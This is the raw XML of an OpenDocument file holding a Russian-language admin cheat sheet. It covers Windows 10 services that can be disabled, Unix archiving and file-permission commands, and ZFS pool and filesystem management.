      <text:p text:style-name="P1">Служба лицензий клиента (ClipSVC) - после отключения этой службы могут неправильно работать приложения интегрированного в Windows 10 Microsoft Store, поэтому будьте осторожны.</text:p>
      <text:p text:style-name="P1">Служба маршрутизатора AllJoyn - протокол передачи данных, который рядовому пользователю скорее всего не потребуется.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Служба наблюдения за датчиками - аналогично службе датчиков и их данных, может быть деактивирована без вреда для ОС.</text:span></text:p>
      <text:p text:style-name="P13">Служба обмена данными — Hyper-V.</text:p>
      <text:p text:style-name="P13">Служба общего доступа к портам Net.TCP - предоставляет возможность совместного использования TCP-портов. Если таковая вам не нужна, можете деактивировать функцию.</text:p>
      <text:p text:style-name="P1">Служба поддержки Bluetooth - можно отключить лишь в том случае, если вы не используете Bluetooth-совместимые устройства и не планируете этого делать.</text:p>
      <text:p text:style-name="P1">Служба пульса - Hyper-V.</text:p>
      <text:p text:style-name="P1">Служба сеансов виртуальных машин Hyper-V.</text:p>
      <text:p text:style-name="P1">Служба синхронизации времени Hyper-V.</text:p>
      <text:p text:style-name="P1">Служба шифрования дисков BitLocker - если вы не используете данную функцию Windows, можете отключать.</text:p>
      <text:p text:style-name="P1">Удаленный реестр - открывает возможность удаленного доступа к реестру и может быть полезна для системного администратора, но рядовому пользователю не нужна. Удостоверение приложения - идентифицирует ранее заблокированные приложения. Если не пользуетесь функцией AppLocker, можете смело отключать данную службу.</text:p>
      <text:p text:style-name="P1">Архивация и сжатие файлов</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">gzip</text:span><text:span text:style-name="T3"> -9 </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 - Поместить файл </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 в архив </text:span><text:span text:style-name="T2">gzip</text:span><text:span text:style-name="T3"> с максимальной степенью сжатия</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">rar</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1.</text:span><text:span text:style-name="T2">rar</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">2 </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">1 - Создать </text:span><text:span text:style-name="T2">rar</text:span><text:span text:style-name="T3"> архив </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1.</text:span><text:span text:style-name="T2">rar</text:span><text:span text:style-name="T3">, заархивировав файлы: </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1, </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">2 и директорию: </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">1</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># rar a file1.rar test_file - Упаковать в rar архив file1.rar файл test_file</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># rar x file.rar - Разархивировать rar архив file.rar</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># bzip2 file1 - Сжимает файл file1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># bunzip2 file1.bz2 - Разжимает файл file1.bz2</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># gzip file1 - Сжимает файл file1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># gunzip file1.gz - Разжимает файл file1.gz</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># tar -cvf archive.tar file1 file2 dir1 - </text:span><text:span text:style-name="T3">Создать</text:span><text:span text:style-name="T2"> tar </text:span><text:span text:style-name="T3">архив</text:span><text:span text:style-name="T2"> archive.tar, </text:span><text:span text:style-name="T3">упаковав</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">него</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">файлы</text:span><text:span text:style-name="T2"> file1, file2 </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">директорию</text:span><text:span text:style-name="T2"> dir1</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># tar -cvf archive.tar file - </text:span><text:span text:style-name="T3">Упаковать</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> tar-</text:span><text:span text:style-name="T3">архив</text:span><text:span text:style-name="T2"> archive.tar, </text:span><text:span text:style-name="T3">файл</text:span><text:span text:style-name="T2"> file</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># tar -tf archive.tar - </text:span><text:span text:style-name="T3">Вывести</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">содержимое</text:span><text:span text:style-name="T2"> tar </text:span><text:span text:style-name="T3">архива</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># tar -xvf archive.tar - </text:span><text:span text:style-name="T3">Распаковать</text:span><text:span text:style-name="T2"> tar </text:span><text:span text:style-name="T3">архив</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># tar -xvf archive.tar -C /tmp - Распаковать архив в /tmp</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">cvfz</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">archive</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">gz</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">1 - Создать </text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> архив и сжать его с помощью программы </text:span><text:span text:style-name="T2">gzip</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">xvfz</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">archive</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">gz</text:span><text:span text:style-name="T3"> - Разжать </text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> архив и распаковать его</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">cvfj</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">archive</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">bz</text:span><text:span text:style-name="T3">2 </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">1 - Создать архив и сжать его с помощью </text:span><text:span text:style-name="T2">bzip</text:span><text:span text:style-name="T3">2 (ключ -</text:span><text:span text:style-name="T2">j</text:span><text:span text:style-name="T3"> работает не во всех *</text:span><text:span text:style-name="T2">nix</text:span><text:span text:style-name="T3"> системах )</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">xvfj</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">archive</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">bz</text:span><text:span text:style-name="T3">2 - Разжать архив и распаковать его (ключ -</text:span><text:span text:style-name="T2">j</text:span><text:span text:style-name="T3"> работает не во всех *</text:span><text:span text:style-name="T2">nix</text:span><text:span text:style-name="T3"> системах)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">zip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1.</text:span><text:span text:style-name="T2">zip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 - Создать сжатый </text:span><text:span text:style-name="T2">zip</text:span><text:span text:style-name="T3">-архив</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">zip</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1.</text:span><text:span text:style-name="T2">zip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">2 </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">1 - Запаковать в архив несколько файлов и/или директорий</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">unzip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1.</text:span><text:span text:style-name="T2">zip</text:span><text:span text:style-name="T3"> - Разжать и распаковать </text:span><text:span text:style-name="T2">zip</text:span><text:span text:style-name="T3">-архив</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">unrar</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">x</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1.</text:span><text:span text:style-name="T2">rar</text:span><text:span text:style-name="T3"> - Распаковать </text:span><text:span text:style-name="T2">rar</text:span><text:span text:style-name="T3">-архив</text:span></text:p>
      <text:p text:style-name="P13">Работа с правами доступа файлов и директорий</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chown</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> - Назначить пользователя </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> владельцем файла </text:span><text:span text:style-name="T2">file</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chown</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">R</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">directory</text:span><text:span text:style-name="T3"> - Рекурсивно обойти директорию </text:span><text:span text:style-name="T2">directory</text:span><text:span text:style-name="T3"> и назначить пользователя </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> владельцем всех вложенных файлов и директорий</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chown</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3">:</text:span><text:span text:style-name="T2">group</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> - Назначить владельца и группу для файла /</text:span><text:span text:style-name="T2">file</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chmod</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ugo</text:span><text:span text:style-name="T3">+</text:span><text:span text:style-name="T2">rwx</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">directory</text:span><text:span text:style-name="T3"> - Установить полные права доступа </text:span><text:span text:style-name="T2">rwx</text:span><text:span text:style-name="T3"> ( </text:span><text:span text:style-name="T2">Read</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Write</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">eXecute</text:span><text:span text:style-name="T3"> ) для всех </text:span><text:span text:style-name="T2">ugo</text:span><text:span text:style-name="T3"> ( </text:span><text:span text:style-name="T2">User</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Group</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Other</text:span><text:span text:style-name="T3"> ) на директорию /</text:span><text:span text:style-name="T2">directory</text:span><text:span text:style-name="T3">. То-же самое можно сделать, используя числовой представление </text:span><text:span text:style-name="T2">chmod</text:span><text:span text:style-name="T3"> 777 </text:span><text:span text:style-name="T2">directory</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chmod</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">go</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">rwx</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">directory</text:span><text:span text:style-name="T3"> - Удалить все права на директорию /</text:span><text:span text:style-name="T2">directory</text:span><text:span text:style-name="T3"> для группы и остальных</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chgrp</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">new</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">group</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> - Изменить группу-владельца для </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> на </text:span><text:span text:style-name="T2">new</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">group</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становить так называемый </text:span><text:span text:style-name="T2">STIKY</text:span><text:span text:style-name="T3">-бит на директорию /</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">public</text:span><text:span text:style-name="T3">. Удалить файл в такой директории может только владелец данного файла</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далить </text:span><text:span text:style-name="T2">STIKY</text:span><text:span text:style-name="T3">-бит с директории /</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">public</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># chmod u+s /bin/binary_file - </text:span><text:span text:style-name="T3">Установить</text:span><text:span text:style-name="T2"> SUID-</text:span><text:span text:style-name="T3">бит</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">файл</text:span><text:span text:style-name="T2"> /bin/binary_file. </text:span><text:span text:style-name="T3">Это позволяет любому пользователю системы, запускать данный файл с правами владельца файла</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># chmod u-s /bin/binary_file - Удалить SUID-бит с файла /bin/binary_file</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># chmod g+s /home/public - </text:span><text:span text:style-name="T3">Установить</text:span><text:span text:style-name="T2"> SGID-</text:span><text:span text:style-name="T3">бит</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">директории</text:span><text:span text:style-name="T2"> /home/public</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># chmod g-s /home/public - Удалить SGID-бит с директории /home/public</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3"> / -</text:span><text:span text:style-name="T2">perm</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">u</text:span><text:span text:style-name="T3">+</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> - Поиск всех файлов с установленным </text:span><text:span text:style-name="T2">SUID</text:span><text:span text:style-name="T3"> битом, начиная с корня файловой системы</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">lh</text:span><text:span text:style-name="T3"> - Листинг текущего каталога с правами доступа</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Шпаргалка по </text:span><text:span text:style-name="T2">ZFS</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">modinfo</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> | </text:span><text:span text:style-name="T2">head</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> 9 - узнать версию </text:span><text:span text:style-name="T2">ZFS</text:span><text:span text:style-name="T3"> и другие подробности</text:span></text:p>
      <text:p text:style-name="P1">Информация о пулах / файловых системах (ФС) на пулах</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3"> - статус пулов</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">status</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">v</text:span><text:span text:style-name="T3"> - статус пулов подробный</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3"> - список ФС, так называются монтируемые разделы в пулах</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">get</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">all</text:span><text:span text:style-name="T3"> - вся инфа по пулам, вообще вся</text:span></text:p>
      <text:p text:style-name="P1">Управление пулами / дисками</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">lha</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">by</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">id</text:span><text:span text:style-name="T3">/ - выяснить айдишники дисков чтобы потом на них создать пул (будут проблемы если подцепишь по буквенному названию диска типа </text:span><text:span text:style-name="T2">sda</text:span><text:span text:style-name="T3">, они динамически меняются)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">create</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">id</text:span><text:span text:style-name="T3">-1 </text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">id</text:span><text:span text:style-name="T3">-2 - может быть сколько угодно дисков, с ключом -</text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T3"> форсить создание пула</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">create</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">m</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">id</text:span><text:span text:style-name="T3">-1 - создать пул с указанием папки маунтирования</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">destroy</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> - уничтожить пул </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">, с ключом -</text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T3"> форсить уничтожение</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mkfile</text:span><text:span text:style-name="T3"> 100</text:span><text:span text:style-name="T2">m</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">1 </text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">2 - создать файлы дисков</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">create</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">1 /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">2- создать пул </text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3"> на созданных файлах</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">create</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">mirror</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">1 /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">2 - создать пул </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> с зеркалированием на 2 диска</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">add</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">3 - добавить диск в пул</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">attach</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">3 - добавить устройство в пул, если он в зеркале то станет в зеркало, если простой, то пул расширится</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">remove</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">mirror</text:span><text:span text:style-name="T3">-1</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">detach</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">3 - исключить устройство из пула</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">remove</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">3 - удаление устройства из пула</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">add</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">spare</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">3 - добавление диска горячей замены в пул</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">remove</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">spare</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">3 - удаление диска горячей замены из пула</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">offline</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">1 - отключить устройство, на него не будет никакой записи и с него чтения, если добавить ключ -</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3">, то после ребута станет онлайн</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool online zfspool /disk1 - включить disk1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">replace</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">1 /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">3 - заменить </text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3"> 1, например в случае неисправности на </text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">3</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">upgrade</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">v</text:span><text:span text:style-name="T3"> - увидеть версию, и фичи текущего </text:span><text:span text:style-name="T2">ZFS</text:span><text:span text:style-name="T3">, -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> обновит все пулы до новейшей версии</text:span></text:p>
      <text:p text:style-name="P1">Создание ФС и свойства ФС</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">create</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">data</text:span><text:span text:style-name="T3"> - создать ФС </text:span><text:span text:style-name="T2">data</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">create</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3"> создать ФС </text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">, обе ФС будут бесконтрольно расти, пока не выставлены квоты</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">destroy</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">fr</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">old</text:span><text:span text:style-name="T3"> - уничтожит ФС </text:span><text:span text:style-name="T2">old</text:span><text:span text:style-name="T3">, ключ -</text:span><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> - рекурсивно, если внутри ещё несколько ФС, -</text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T3"> - форсить</text:span></text:p>
